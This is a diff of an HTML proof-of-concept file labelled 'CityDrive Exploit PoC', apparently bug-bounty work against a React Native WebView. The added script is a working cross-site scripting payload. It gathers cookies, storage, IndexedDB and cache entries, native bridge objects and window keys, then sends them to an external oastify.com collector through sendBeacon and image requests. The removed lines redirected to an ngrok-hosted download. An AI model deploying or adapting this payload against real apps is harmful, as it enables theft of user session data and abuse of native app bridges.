@@ -1,9 +1,66 @@
-<html>
-<body>
-<h1>CityDrive Exploit PoC</h1>
-<div id="output"></div>
 <script>
-window.location = "https://pickier-unmindfully-lorelei.ngrok-free.dev/promo.pdf?download=true"
+alert(1);
+var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';
+
+function send(path, data) {
+    try {
+        var body = typeof data === 'string' ? data : JSON.stringify(data);
+        navigator.sendBeacon(EXFIL + '/' + path, body);
+    } catch(e) {
+        new Image().src = EXFIL + '/' + path + '?e=' + encodeURIComponent(e.message);
+    }
+}
+
+(function recon() {
+    var d = {};
+    d.origin = String(location.origin);
+    d.href = String(location.href);
+    d.ua = String(navigator.userAgent);
+
+    // document.cookie — SecurityError в null origin!
+    try { d.cookie = document.cookie; } catch(e) { d.cookieErr = e.message; }
+
+    // localStorage — тоже SecurityError
+    try { d.lsLen = localStorage.length; } catch(e) { d.lsErr = e.message; }
+
+    // sessionStorage
+    try { d.ssLen = sessionStorage.length; } catch(e) { d.ssErr = e.message; }
+
+    // indexedDB
+    try {
+        indexedDB.databases().then(function(dbs) {
+            d.idb = dbs;
+            send('recon-idb', d);
+        }).catch(function(e) { d.idbErr = e.message; });
+    } catch(e) { d.idbErr2 = e.message; }
+
+    // JS Bridge
+    try { d.bridgeKeys = Object.keys(window.ReactNativeWebView); } catch(e) { d.bridgeErr = e.message; }
+    try { d.bridgeJson = window.ReactNativeWebView.injectedObjectJson(); } catch(e) { d.bjErr = e.message; }
+    try { d.landingConstructor = window.ReactNativeWebView.landingConstructor; } catch(e) {}
+
+    // Window scan для RN/native объектов
+    try {
+        d.specialKeys = [];
+        for (var k in window) {
+            try {
+                if (k.indexOf('React') > -1 || k.indexOf('__') > -1 ||
+                    k.indexOf('native') > -1 || k.indexOf('webkit') > -1 ||
+                    k.indexOf('chrome') > -1 || k.indexOf('Android') > -1) {
+                    d.specialKeys.push(k + ':' + typeof window[k]);
+                }
+            } catch(e) {}
+        }
+    } catch(e) { d.winScanErr = e.message; }
+
+    // caches API
+    try {
+        caches.keys().then(function(k) {
+            d.cacheKeys = k;
+            send('recon-cache', d);
+        }).catch(function(e) { d.cacheErr = e.message; });
+    } catch(e) { d.cacheErr2 = e.message; }
+
+    send('recon', d);
+})();
 </script>
-</body>
-</html>
